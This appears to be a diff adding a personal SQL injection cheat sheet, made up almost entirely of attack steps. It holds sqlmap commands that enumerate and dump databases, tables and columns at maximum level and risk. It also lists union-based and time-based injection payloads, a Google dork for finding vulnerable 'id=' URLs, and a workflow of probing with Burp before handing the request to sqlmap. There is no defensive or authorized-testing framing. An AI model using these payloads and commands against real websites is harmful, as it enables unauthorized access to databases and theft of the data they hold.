@@ -1,0 +1,40 @@
+SQL INJECTION
+
+ sqlmap -r filename.txt --dbs => o/p DATABASES
+
+
+sqlmap -r filename.txt -D xxx --table  => o/p Tables from databases
+
+
+sqlmap -r filename.txt -D xxx -T xxx  --columns  => Columns to the Db
+
+
+Union BAsed => +UNION+ALL+SELECT+CONCAT(0x717a6a7871,0x64474b5849676f76524f5679504656437849565377737376695844666e546b526169554e66436366,0x716b6b6b71),@@version,NULL,NULL,NULL,NULL--
+-> Put this in Requrst=
+
+
++AND+(SELECT+5288+FROM+(SELECT(SLEEP(15)))WNdY)  => Time Based
+
+admin'+and+false+UNION+SELECT+version(),222,333,444,555,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--+-
+
+Sql Injection: Check for .php website Using Wapplizer 
+site:xyz.com inurl:id= [If any Url Found]
+xyz.com?id=1' [Put id=1'] if gives SQL error
+id=1+and+sleep(6) [inject Sleep Command In Repeater]
+GET /xyz.com?id=1+and+sleep(6) HTTP/1.1 // View the Response
+
+
+https://hajarerutik9.medium.com/sql-injection-via-hidden-parameter-6da7699248fc => Sql Dump by an sql error 
+1' AND sleep(5) => PAyload Used 
+
+
+*try login with admin admin and send login request  to burp
+*do an active scan
+if show SQL injection with parameter 
+#POC 
+copy request in txt 
+and on sqlmap 
+sqlmap -r sql.txt --force-ssl --level 5 --risk 3 --dbs -p parameter
+
+and you have a valid SQL INJ Smiling face with sunglassesSmiling face with sunglasses
+ 
